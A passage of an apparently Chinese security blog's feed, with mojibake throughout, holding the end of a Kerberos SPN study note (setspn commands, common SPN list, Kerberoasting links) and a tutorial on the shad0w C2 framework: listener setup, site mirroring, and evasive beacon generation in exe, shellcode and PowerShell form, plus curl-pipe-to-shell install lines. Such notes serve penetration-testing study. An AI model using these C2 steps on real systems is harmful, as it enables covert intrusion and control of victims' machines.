title="å…³äºSPN"></a>å…³äºSPN</h2><blockquote><p> æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼‰æ˜¯Kerberoså®¢æˆ·ç«¯ç”¨äºå”¯ä¸€æ ‡è¯†ç»™ç‰¹å®šKerberosç›®æ ‡è®¡ç®—æœºçš„æœåŠ¡å®ä¾‹åç§°ã€‚</p></blockquote><p>æœåŠ¡ä¸»ä½“åç§°æ˜¯æœåŠ¡å®ä¾‹ï¼ˆæœ‰ç‚¹ç±»ä¼¼æœåŠ¡ï¼Œä¾‹å¦‚HTTPã€MSSQLï¼‰çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚Kerberos èº«ä»½éªŒè¯ä½¿ç”¨ SPN å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”ã€‚å› æ­¤SPNæ‰«æå¯ä»¥é€šè¿‡åŸŸæ§æ‰§è¡ŒæœåŠ¡å‘ç°ã€‚</p><h2 id="SPNåŸºç¡€é…ç½®"><a href="#SPNåŸºç¡€é…ç½®" class="headerlink" title="SPNåŸºç¡€é…ç½®"></a>SPNåŸºç¡€é…ç½®</h2><blockquote><p> è¯¦ç»†å¯ä»¥æŸ¥çœ‹å¾®è½¯å®˜æ–¹æ‰‹å†Œ<br> <a href="https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn">https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn</a></p></blockquote><p><strong>SPNæ ¼å¼</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;</span><br><span class="line"></span><br><span class="line">&lt;service class&gt;ï¼šæ ‡è¯†æœåŠ¡ç±»çš„å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">&lt;host&gt;ï¼šæœåŠ¡æ‰€åœ¨ä¸»æœºåç§°</span><br><span class="line"></span><br><span class="line">&lt;port&gt;ï¼šæœåŠ¡ç«¯å£</span><br><span class="line"></span><br><span class="line">&lt;service name&gt;ï¼šæœåŠ¡åç§°</span><br></pre></td></tr></table></figure><p><strong>SPNæ³¨å†Œ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setspn -S http/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt;</span><br><span class="line"></span><br><span class="line">-S å‚æ•°ï¼šéªŒè¯ä¸å­˜åœ¨é‡å¤é¡¹åï¼Œæ·»åŠ éšæ„ SPNã€‚æ³¨æ„ï¼š -S ä» Windows Server 2008 å¼€å§‹ç³»ç»Ÿé»˜è®¤æä¾›ã€‚</span><br><span class="line">å¦‚ï¼š</span><br><span class="line">Setspn-A HTTP/test.test.com:80 test</span><br><span class="line">ä¸»æœºtestçš„HTTPæœåŠ¡æ³¨å†Œåˆ°SPN</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢å·²ç»æ³¨å†Œçš„SPN</span><br><span class="line">setspn -q */*</span><br><span class="line">æŸ¥è¯¢æŒ‡å®šåŸŸçš„SPN</span><br><span class="line">setspn -T test.com -q */*</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/O9CviZ.png" alt="O9CviZ"><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/9WgVG6.png" alt="9WgVG6"></p><blockquote><p> ä¸€èˆ¬æƒ…å†µä¸‹åŸºäºä¸»æœºçš„æœåŠ¡ä¼šçœç•¥åé¢ä¸¤ä¸ªç»„ä»¶ï¼Œæ ¼å¼ä¸º<service class>/<host>,å¦‚ï¼š<br> <code>HTTP/test.test.com</code><br> ç‰¹åˆ«é’ˆå¯¹å¦‚æœæœåŠ¡ä½¿ç”¨éé»˜è®¤ç«¯å£éœ€è¦åŠ ä¸Šç‰¹å®šç«¯å£å’ŒæœåŠ¡å</p></blockquote><h2 id="SPNåˆ©ç”¨"><a href="#SPNåˆ©ç”¨" class="headerlink" title="SPNåˆ©ç”¨"></a>SPNåˆ©ç”¨</h2><p><strong>SPNæ‰«æ</strong><br>åœ¨æŸ¥è¯¢SPNçš„æ—¶å€™ï¼Œä¼šå‘åŸŸæ§åˆ¶å™¨å‘èµ·LDAPæŸ¥è¯¢ï¼Œè¿™æ˜¯æ­£å¸¸Kerberosç¥¨æ®è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥è¿™ä¸ªæ“ä½œå¾ˆéš¾è¢«æ£€æµ‹å‡ºæ¥ã€‚æ¢å¥è¯è¯´æˆ‘ä»¬çš„SPNæ‰«æå’ŒSPNæŸ¥è¯¢ï¼Œå®é™…ä¸Šå°±æ˜¯æŸ¥è¯¢LDAPä¸­å­˜å‚¨çš„å†…å®¹ï¼Œåœ¨åŸŸæ§ä¸­é»˜è®¤å®‰è£…æœ‰ADSIç¼–è¾‘å™¨ï¼Œå®ƒæ˜¯LDAPçš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥é€šè¿‡åŸŸæ§ä¸­è¿è¡Œ<code>adsiedit.msc</code>æ‰“å¼€ã€‚<br><strong>å¸¸è§çš„SPNå®ä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AcronisAgentï¼šé’ˆå¯¹Acroniså¤‡ä»½å’Œæ•°æ®æ¢å¤è½¯ä»¶</span><br><span class="line">AdtServerï¼šå¸¦æœ‰ACSçš„Microsoft System Center Operations Managerï¼ˆ2007/2012ï¼‰ç®¡ç†æœåŠ¡å™¨</span><br><span class="line">afpserverï¼šAppleå½’æ¡£åè®®</span><br><span class="line">AgpmServerï¼šMicrosofté«˜çº§ç»„ç­–ç•¥ç®¡ç†ï¼ˆAGPMï¼‰</span><br><span class="line">aradminsvc - ä»»åŠ¡ä¸»è§’è‰²æœåŠ¡å™¨</span><br><span class="line">arssvc - ä»»åŠ¡ä¸»è§’è‰²æœåŠ¡å™¨</span><br><span class="line">bocmsï¼šå•†ä¸šåŒ–CMS</span><br><span class="line">BOSSOï¼šå•†ä¸šå¯¹è±¡</span><br><span class="line">CESREMOTEï¼šä¸VMWareä¸Šçš„Citrix VDIè§£å†³æ–¹æ¡ˆæœ‰å…³ï¼Œè®¸å¤šVDIå·¥ä½œç«™éƒ½æœ‰è¿™ä¸ªSPNã€‚</span><br><span class="line">cifsï¼šé€šç”¨Internetæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">CmRcServiceï¼šMicrosoftç³»ç»Ÿä¸­å¿ƒé…ç½®ç®¡ç†å™¨ï¼ˆSCCMï¼‰è¿œç¨‹æ§åˆ¶</span><br><span class="line">CUSESSIONKEYSVRï¼šCiscoUnity VOIPç³»ç»Ÿ</span><br><span class="line">cvsï¼šCVSåº“</span><br><span class="line">Dfsr *ï¼šåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">DNSï¼šåŸŸåæœåŠ¡å™¨</span><br><span class="line">E3514235-4B06-11D1-AB04-00C04FC2DCD2ï¼šNTDS DC RPCå¤åˆ¶</span><br><span class="line">E3514235-4B06-11D1-AB04-00C04FC2DCD2-ADAMï¼šADAMå®ä¾‹</span><br><span class="line">EDVRï¼šExacqVisionæœåŠ¡</span><br><span class="line">exchangeABï¼šExchangeé€šè®¯ç°¿æœåŠ¡ï¼ˆé€šå¸¸æ˜¯æ”¯æŒNSPIçš„åŸŸæ§åˆ¶å™¨ï¼Œä¹Ÿé€šå¸¸æ˜¯æ‰€æœ‰çš„GCï¼‰</span><br><span class="line">exchangeMDBï¼šRPCå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨è§’è‰²</span><br><span class="line">exchangeRFRï¼šäº¤æ¢é€šè®¯ç°¿æœåŠ¡</span><br><span class="line">fcsvrï¼šApple FinalCut Server</span><br><span class="line">FileRepServiceï¼šWSFileRepService.exe</span><br><span class="line">FIMServiceï¼šMicrosoftForefrontæ ‡è¯†ç®¡ç†å™¨ï¼ˆFIMï¼‰</span><br><span class="line">ftpï¼šæ–‡ä»¶ä¼ è¾“åè®®</span><br><span class="line">GCï¼šåŸŸæ§åˆ¶å™¨å…¨å±€ç¼–å½•æœåŠ¡</span><br><span class="line">HDFSï¼šHadoopï¼ˆAmbariï¼‰</span><br><span class="line">hostï¼šä¸»æœºæœåŠ¡ä»£è¡¨ä¸»æœºã€‚HOSTSPNç”¨äºåœ¨åˆ›å»ºæœåŠ¡ç¥¨æ®æ—¶è®¿é—®ç”±Kerberosåè®®ä½¿ç”¨é•¿æœŸå¯†é’¥çš„ä¸»æœºå¸æˆ·ã€‚</span><br><span class="line">httpï¼šæ”¯æŒKerberosèº«ä»½éªŒè¯çš„httpç½‘ç»œæœåŠ¡çš„SPN</span><br><span class="line">Hyper-Vå‰¯æœ¬æœåŠ¡ï¼šMicrosoftHyper-Vçš„å‰¯æœ¬æœåŠ¡</span><br><span class="line">IMAPï¼šInternetæ¶ˆæ¯è®¿é—®åè®®</span><br><span class="line">IMAP4ï¼šInternetæ¶ˆæ¯è®¿é—®åè®®ç‰ˆæœ¬4</span><br><span class="line">ippï¼šInternetæ‰“å°åè®®</span><br><span class="line">iSCSITargetï¼šiSCSI é…ç½®</span><br><span class="line">kadminï¼šKerberos</span><br><span class="line">ldapï¼šLDAPæœåŠ¡ï¼Œå¦‚åŸŸæ§åˆ¶å™¨æˆ–ADAMå®ä¾‹ã€‚</span><br><span class="line">Magfsï¼šMaginaticsMagFS</span><br><span class="line">mapredï¼šCloudera</span><br><span class="line">Microsoftè™šæ‹Ÿæ§åˆ¶å°æœåŠ¡ï¼šHyperVä¸»æœº</span><br><span class="line">Microsoftè™šæ‹Ÿç³»ç»Ÿè¿ç§»æœåŠ¡ï¼šP2Væ”¯æŒï¼ˆHyper-Vï¼‰</span><br><span class="line">mongodï¼šMongoDBEnterprise</span><br><span class="line">mongosï¼šMongoDBEnterprise</span><br><span class="line">MSClusterVirtualServerï¼šWindowsç¾¤é›†æœåŠ¡å™¨</span><br><span class="line">MSOLAPSvcï¼šSQLServeråˆ†ææœåŠ¡</span><br><span class="line">MSOLAPSvc.3ï¼šSQLServeråˆ†ææœåŠ¡</span><br><span class="line">MSOLAPDisco.3ï¼šSQLServeråˆ†ææœåŠ¡</span><br><span class="line">MSOMHSvcï¼šMicrosoftç³»ç»Ÿä¸­å¿ƒè¿è¥ç»ç†ï¼ˆ2007/2012ï¼‰ç®¡ç†æœåŠ¡å™¨</span><br><span class="line">MSOMSdkSvcï¼šMicrosoftSystem Center Operations Managerï¼ˆ2007/2012ï¼‰ç®¡ç†æœåŠ¡å™¨</span><br><span class="line">MSServerClusterï¼šWindowsç¾¤é›†æœåŠ¡å™¨</span><br><span class="line">MSServerClusterMgmtAPIï¼šæ­¤ç¾¤é›†APIéœ€è¦æ­¤SPNæ‰èƒ½é€šè¿‡ä½¿ç”¨Kerberoså‘æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯</span><br><span class="line">MSSQLï¼šMicrosoft SQLServer</span><br><span class="line">MSSQLSvcï¼šMicrosoftSQL Server</span><br><span class="line">MSSQL $ ADOBECONNECTï¼šæ”¯æŒAdobe Connectçš„Microsoft SQL Server</span><br><span class="line">MSSQL $ BIZTALKï¼šMicrosoftSQL Serveræ”¯æŒMicrosoft BiztalkæœåŠ¡å™¨</span><br><span class="line">MSSQL $ BUSINESSOBJECTSï¼šæ”¯æŒBusiness Objectsçš„Microsoft SQL Server</span><br><span class="line">MSSQL $ DB01NETIQï¼šæ”¯æŒNetIQçš„Microsoft SQL Server</span><br><span class="line">nfsï¼šç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">NPPolicyEvaluatorï¼šæˆ´å°”Questå®¡è®¡å‘˜</span><br><span class="line">NPRepository 4ï¼ˆCHANGEAUDITORï¼‰ï¼šæˆ´å°”Quest Change Auditor</span><br><span class="line">NPRepository4ï¼ˆCAADï¼‰ï¼šæˆ´å°”Questå®¡æ ¸å‘˜</span><br><span class="line">NPRepository4ï¼ˆé»˜è®¤ï¼‰ï¼šæˆ´å°”ä»»åŠ¡å®¡è®¡å‘˜</span><br><span class="line">NtFrs *ï¼šNTæ–‡ä»¶å¤åˆ¶æœåŠ¡</span><br><span class="line">oracleï¼šOracleKerberosèº«ä»½éªŒè¯</span><br><span class="line">pcastï¼šè‹¹æœæ’­å®¢åˆ¶ä½œäºº</span><br><span class="line">PCNSCLNTï¼šè‡ªåŠ¨å¯†ç åŒæ­¥è§£å†³æ–¹æ¡ˆï¼ˆMIIS 2003ï¼†FIMï¼‰</span><br><span class="line">POPï¼šé‚®ç®±åè®®</span><br><span class="line">POP3ï¼šé‚®ç®±åè®®ç‰ˆæœ¬3</span><br><span class="line">PVSSoapï¼šCitrix ProvisioningServicesï¼ˆ7.1ï¼‰</span><br><span class="line">RestrictedKrbHostï¼šä½¿ç”¨æœåŠ¡ç±»å­—ç¬¦ä¸²ç­‰äºâ€œRestrictedKrbHostâ€çš„ SPNçš„æœåŠ¡ç±»ï¼Œå…¶æœåŠ¡å‡­å•ä½¿ç”¨è®¡ç®—æœºå¸æˆ·å¯†é’¥å¹¶å…±äº«ä¼šè¯å¯†é’¥ã€‚</span><br><span class="line">RPCï¼šè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡</span><br><span class="line">SAPï¼šSAP /SAPService</span><br><span class="line">SASï¼šSASæœåŠ¡å™¨</span><br><span class="line">SCVMMï¼šSystem Centerè™šæ‹Ÿæœºç®¡ç†å™¨</span><br><span class="line">secshdï¼šIBMInfoSphere</span><br><span class="line">sipï¼šä¼šè¯å¯åŠ¨åè®®</span><br><span class="line">SMTPï¼šç®€å•é‚®ä»¶ä¼ è¾“åè®®</span><br><span class="line">SMTPSVCï¼šç®€å•é‚®ä»¶ä¼ è¾“åè®®</span><br><span class="line">SoftGridï¼š Microsoftåº”ç”¨ç¨‹åºè™šæ‹ŸåŒ–ï¼ˆApp-Vï¼‰ä»¥å‰çš„â€œSoftGridâ€</span><br><span class="line">STSï¼šVMWare SSOæœåŠ¡</span><br><span class="line">SQLAgent $ DB01NETIQï¼šNetIQçš„SQLæœåŠ¡</span><br><span class="line">tapinegoï¼šä¸è·¯ç”±åº”ç”¨ç¨‹åºç›¸å…³è”ï¼Œä¾‹å¦‚Microsofté˜²ç«å¢™ï¼ˆISAï¼ŒTMGç­‰ï¼‰</span><br><span class="line">TERMSRVï¼šMicrosoftè¿œç¨‹æ¡Œé¢åè®®æœåŠ¡ï¼Œåˆåç»ˆç«¯æœåŠ¡ã€‚</span><br><span class="line">tnetdï¼šJuniperKerberosèº«ä»½éªŒè¯ â€œTnetdæ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œç”¨äºè·¯ç”±å¼•æ“å’Œæ•°æ®åŒ…è½¬å‘å¼•æ“ç­‰ä¸åŒç»„ä»¶ä¹‹é—´çš„å†…éƒ¨é€šä¿¡â€</span><br><span class="line">vmrcï¼šMicrosoft VirtualServer 2005</span><br><span class="line">vncï¼šVNCæœåŠ¡å™¨</span><br><span class="line">VPNï¼šè™šæ‹Ÿä¸“ç”¨ç½‘ç»œ</span><br><span class="line">VProRecovery Backup Execç³»ç»Ÿæ¢å¤ä»£ç†7.0</span><br><span class="line">VProRecovery Backup Execç³»ç»Ÿæ¢å¤ä»£ç†8.0</span><br><span class="line">VProRecovery Backup Execç³»ç»Ÿæ¢å¤ä»£ç†9.0</span><br><span class="line">VProRecoveryè¯ºé¡¿å…‹éš†ä»£ç†12.0</span><br><span class="line">VProRecoveryè¯ºé¡¿</span><br><span class="line">å…‹éš†ä»£ç†14.0 VProRecoveryè¯ºé¡¿å…‹éš†ä»£ç†15.0</span><br><span class="line">VProRecovery Symantecç³»ç»Ÿæ¢å¤ä»£ç†10.0</span><br><span class="line">VProRecovery Symantecç³»ç»Ÿæ¢å¤ä»£ç†11.0</span><br><span class="line">VProRecovery Symantecç³»ç»Ÿæ¢å¤ä»£ç†14.0</span><br><span class="line">vssrvcï¼šå¾®è½¯è™šæ‹ŸæœåŠ¡å™¨ï¼ˆ2005ï¼‰</span><br><span class="line">WSMANï¼šWindowsè¿œç¨‹ç®¡ç†ï¼ˆåŸºäºWS-Managementæ ‡å‡†ï¼‰æœåŠ¡</span><br><span class="line">xmpp / XMPPï¼šå¯æ‰©å±•æ¶ˆæ¯å’Œå‘ˆç°åè®®ï¼ˆJabberï¼‰</span><br><span class="line">xgridï¼šè‹¹æœçš„åˆ†å¸ƒå¼ï¼ˆç½‘æ ¼ï¼‰è®¡ç®—/ Mac OS X 10.6æœåŠ¡å™¨ç®¡ç†</span><br><span class="line">YARNï¼šClouderaMapReduce</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªä¸é”™çš„githubæœ‰å…³SPNçš„é¡¹ç›®ï¼š<br><a href="https://github.com/cyberark/RiskySPN">RiskySPN</a></p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>kerberosè®¤è¯çš„è¿‡ç¨‹æŠŠå…¶ä¸­çš„ç¥¨æ®çš„ç”Ÿæˆå’Œä¸‰è€…ä¹‹é—´çš„å…³ç³»å¼„æ¸…æ¥šè¾ƒä¸ºå…³é”®ï¼Œæˆ‘æ¨èBç«™æœ‰ä¸ªè§†é¢‘è®²çš„ä¸é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kerberos UPä¸»: ziaolin http://www.bilibili.com/video/BV1XW411e7Cs?share_medium=android&amp;share_source=more&amp;bbid=XYADBFAAC65F9C5F6DA603D4376B81D82AFF9&amp;ts=1593051508078</span><br></pre></td></tr></table></figure><p>åç»­æ‰“ç®—å†æŠŠKerberosæ”»å‡»çš„å‡ ç§æ–¹å¼æ•´ç†ç½—åˆ—ä¸€ä¸‹ï¼Œå…ˆç»™è‡ªå·±æŒ–ä¸ªå‘â€¦â€¦</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p> <a href="https://pentestlab.blog/2018/06/12/kerberoast/">https://pentestlab.blog/2018/06/12/kerberoast/</a><br> <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a><br> <a href="https://skypacer210.github.io/2014/04/09/kerberos-those-thing/">https://skypacer210.github.io/2014/04/09/kerberos-those-thing/</a><br> <a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#msdn_pac_request">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#msdn_pac_request</a><br> <a href="https://tools.ietf.org/html/rfc1510">https://tools.ietf.org/html/rfc1510</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;æœ€è¿‘åœ¨å­¦ä¹ åŸŸæ¸—é€ï¼Œæ•´ç†äº†ä¸€ä¸‹å¤§ä½¬çš„å†…å®¹ï¼Œå·©å›ºä¸€ä¸‹KerberosåŸºç¡€ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="åŸŸæ¸—é€" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>C2-shad0w</title>
    <link href="http://example.com/2020/06/14/C2-shad0w/"/>
    <id>http://example.com/2020/06/14/C2-shad0w/</id>
    <published>2020-06-14T08:03:24.000Z</published>
    <updated>2021-09-28T09:46:04.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C2-shad0w"><a href="#C2-shad0w" class="headerlink" title="C2-shad0w"></a>C2-shad0w</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>shad0wæ˜¯ä¸€ä¸ªåå¼€å‘æ¡†æ¶ï¼Œæ—¨åœ¨å®‰å…¨ç½‘ç»œç§˜å¯†è¿è¡Œï¼Œä¸ºæ”»å‡»è€…æä¾›æ›´åŠ ä¾¿åˆ©çš„æ§åˆ¶æ‰‹æ®µã€‚</p></blockquote><p>##ç®€ä»‹ä¸å®‰è£…</p><blockquote><p>sha0wåœ¨dockerå†…éƒ¨è¿è¡Œï¼Œæ‰€ä»¥éœ€è¦å®‰è£…dockerç¯å¢ƒ</p></blockquote><p>è¿™é‡Œä»¥Centos7ä¸ºç¯å¢ƒæ­å»ºï¼Œ</p><ol><li>ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬è‡ªåŠ¨å®‰è£…docker</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å›½å†…daocloud ä¸€é”®å®‰è£…å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><ol start="2"><li>å®‰è£…shad0w</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bats3c/shad0w.git &amp;&amp; cd shad0w</span><br><span class="line">sudo ./shad0w install</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‹‰å–é•œåƒå¦‚ä¸‹ï¼š</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200613180236447.png" alt="image-20200613180236447"></p><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><h3 id="å¼€å¯ç›‘å¬"><a href="#å¼€å¯ç›‘å¬" class="headerlink" title="å¼€å¯ç›‘å¬"></a>å¼€å¯ç›‘å¬</h3><p>å¯åŠ¨C2æœåŠ¡å™¨ï¼Œå¼€å¯ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shdow listen -e &lt;endpoint&gt;</span><br><span class="line">#&lt;endpoint&gt;ä¸ºC2çš„ç›‘å¬ipåœ°å€æˆ–è€…åŸŸåï¼ŒSSLè¯ä¹¦åŒæ—¶åŠ¨æ€ç”Ÿæˆ</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/eHNSZP.png" alt="eHNSZP"></p><p>å¦‚æœè¦ä½¿ç”¨ç½‘ç«™é•œåƒåŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨<code>-m</code>æˆ–è€…<code>--mirror</code>é€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w listen -e www.baidu.com -m  www.qq.com</span><br></pre></td></tr></table></figure><blockquote><p>è¿™è¡¨æ˜å¦‚æœè®¿é—®<a href="http://www.baidu.comçš„c2åœ°å€,å°†è¿”å›www.qq.comçš„å†…å®¹,å¯ä»¥ç†è§£ä¸ºå…‹éš†ç½‘ç«™,æ¯”å¦‚è®¿é—®www.baidu.com/1.html%EF%BC%8C%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AFwww.qq.com/1,html%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">www.baidu.comçš„C2åœ°å€ï¼Œå°†è¿”å›www.qq.comçš„å†…å®¹ï¼Œå¯ä»¥ç†è§£ä¸ºå…‹éš†ç½‘ç«™ï¼Œæ¯”å¦‚è®¿é—®www.baidu.com/1.htmlï¼Œè¿”å›çš„æ˜¯www.qq.com/1,htmlçš„å†…å®¹ã€‚</a></p></blockquote><h3 id="ç”ŸæˆBeacon"><a href="#ç”ŸæˆBeacon" class="headerlink" title="ç”ŸæˆBeacon"></a>ç”ŸæˆBeacon</h3><p>æ ¹æ®ä½œè€…æè¿°ï¼Œ<code>shad0w</code>ç›®å‰åªæ”¯æŒ64ä½beacon</p><p>æœ‰ä¸¤ç§<code>beacon</code>ï¼š<code>secure</code>ã€<code>insecure</code>ï¼Œ</p><p><code>secure beacon</code>ç”¨äºåœ¨çº¢é˜Ÿæµ‹è¯•çš„ç¯å¢ƒï¼Œç›®æ ‡å­˜åœ¨æ£€æµ‹dllæ³¨å…¥ç­‰å®‰å…¨è®¾å¤‡ï¼Œç”¨äºæœ€æ–°ç‰ˆçš„windowsã€‚</p><p><code>insecure beacon</code>æ—¨åœ¨ç”¨äºä¸æ˜¯é‡è¦çš„æ¸—é€æµ‹è¯•ç¯å¢ƒä¸­ï¼Œé€‚ç”¨äºå„ç§windowsç³»ç»Ÿç‰ˆæœ¬ã€‚</p><p><code>beacon</code>ç”Ÿæˆç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p &lt;payload&gt; -H &lt;c2 address&gt; -f &lt;format&gt; -o &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>æ­£ç¡®çš„Payloadæ ¼å¼è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;arch&gt;/&lt;os&gt;&lt;secure&gt;&lt;static&gt;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªä¾‹å­ï¼Œè¦ç”Ÿæˆä¸€ä¸ªé™æ€çš„windows 64ä½çš„beacon</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x64/windows/secure/static</span><br></pre></td></tr></table></figure><p>Examble 1ï¼ˆ<code>secure beacon</code>ï¼‰:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows/secure -H www.baidu.com -f exe -o baidu.exe</span><br></pre></td></tr></table></figure><p>Examble 2 (<code>insecure beacon</code>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows -H www.baidu.com -f exe -o baidu.exe</span><br></pre></td></tr></table></figure><p>å¯¹äº<code>format</code>æœ‰ä¸‰ç§é€‰æ‹©ï¼šexeã€shellcodeã€powershell</p><p>Examble 3</p><p>å¯¹äºshellcodeå’Œpowershellçš„beaconï¼Œå¯ä»¥ä½¿ç”¨<code>raw</code>å’Œ<code>psh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w beacon -p x64/windows/secure -H www.baidu.com -f raw -o baidu.binshad0w beacon -p x64/windows/secure/static -H www.baidu.com -f psh -o baidu.ps1</span><br></pre></td></tr></table></figure><h2 id="è¾…åŠ©ç”¨æ³•"><a href="#è¾…åŠ©ç”¨æ³•" class="headerlink" title="è¾…åŠ©ç”¨æ³•"></a>è¾…åŠ©ç”¨æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt;help  #æŸ¥çœ‹å¸®åŠ©é¡µé¢</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt; beacons #æŸ¥çœ‹å½“å‰åœ¨çº¿çš„ä¸»æœº</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shad0w &gt;&gt; beacons -i 1 # Intercatä¼šè¯IDä¸º1çš„ä¸»æœº</span><br></pre></td></tr></table></figure><h2 id="æ•ˆæœå¦‚ä¸‹ï¼š"><a href="#æ•ˆæœå¦‚ä¸‹ï¼š" class="headerlink" title="æ•ˆæœå¦‚ä¸‹ï¼š"></a>æ•ˆæœå¦‚ä¸‹ï¼š</h2><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/7bT7hf.png" alt="7bT7hf"></p><p>é€šè¿‡<code>help</code>å‘½ä»¤å¯æŸ¥çœ‹ç›¸å…³ç”¨æ³•ï¼Œä¾‹å¦‚å¸¸è§çš„mimikatz</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/O6og3L.png" alt="O6og3L"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C2-shad0w&quot;&gt;&lt;a href=&quot;#C2-shad0w&quot; class=&quot;headerlink&quot; title=&quot;C2-shad0w&quot;&gt;&lt;/a&gt;C2-shad0w&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ç¥å…µåˆ©å™¨" scheme="http://example.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
    <category term="Tool" scheme="http://example.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>Hackbox-Oopsie</title>
    <link href="http://example.com/2020/05/24/Hackbox-Oopsie/"/>
    <id>http://example.com/2020/05/24/Hackbox-Oopsie/</id>
    <published>2020-05-24T15:11:54.000Z</published>
    <updated>2021-09-28T09:20:09.154Z</updated>
    
